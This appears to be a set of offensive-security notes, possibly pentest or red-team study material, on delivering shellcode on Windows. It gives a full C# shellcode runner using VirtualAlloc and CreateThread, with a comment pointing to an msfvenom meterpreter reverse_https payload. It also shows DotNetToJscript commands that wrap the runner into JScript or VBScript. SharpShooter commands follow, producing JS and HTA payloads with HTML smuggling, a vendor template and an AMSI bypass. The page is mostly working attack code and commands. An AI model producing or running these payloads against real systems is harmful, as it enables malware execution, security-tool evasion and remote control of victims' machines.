---
tags:
  - Defense_Evasion
  - Execution
  - Foundational
  - Python
  - Windows
---

## DotNetToJscript
resources: [DotNetToJscript GitHub](https://github.com/tyranid/DotNetToJscript)

> [!info] Converts .NET assemblies to JScript/VBScript. Enables C# shellcode runners via script execution.

### Creating C# Shellcode Runner

#### Visual Studio Project Setup
> [!tip] Create Class Library (.NET Framework) project. Target .NET Framework 4.0 for compatibility.

#### C# Win32 API Imports
```csharp
using System;
using System.Runtime.InteropServices;

public class ShellcodeRunner
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
```

#### Complete C# Shellcode Runner Class
```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class ShellcodeRunner
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public ShellcodeRunner()
    {
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<Port> -f csharp
        byte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

### Generate JScript with DotNetToJscript [Local]

#### Build DLL
> [!tip] Compile C# project to DLL in Release mode.

#### Convert to JScript
```cmd
DotNetToJscript.exe ShellcodeRunner.dll --lang=Jscript --ver=v4 -o payload.js
```

#### Convert to VBScript [alternative]
```cmd
DotNetToJscript.exe ShellcodeRunner.dll --lang=VBScript --ver=v4 -o payload.vbs
```

### JScript Shellcode Runner Output Structure

> [!info] Generated JScript deserializes and instantiates .NET object.

```javascript
// DotNetToJscript generated structure (simplified)
var serialized_obj = "AAEAAAD/////..."; // Base64 serialized assembly
var entry_class = "ShellcodeRunner";

// Deserialization and instantiation logic
var stm = new ActiveXObject("System.IO.MemoryStream");
// ... deserialization code ...
var obj = assembly.CreateInstance(entry_class);
```

## SharpShooter

> [!tip] Framework for payload generation with built-in evasion.

### Generate Staged JScript Payload [Local]
```bash
python SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin --smuggle --template mcafee
```

### Generate HTA Payload [Local]
```bash
python SharpShooter.py --stageless --dotnetver 4 --payload hta --output payload --rawscfile shellcode.bin
```

### Generate with AMSI Bypass [Local]
```bash
python SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin --amsi amsienable
```
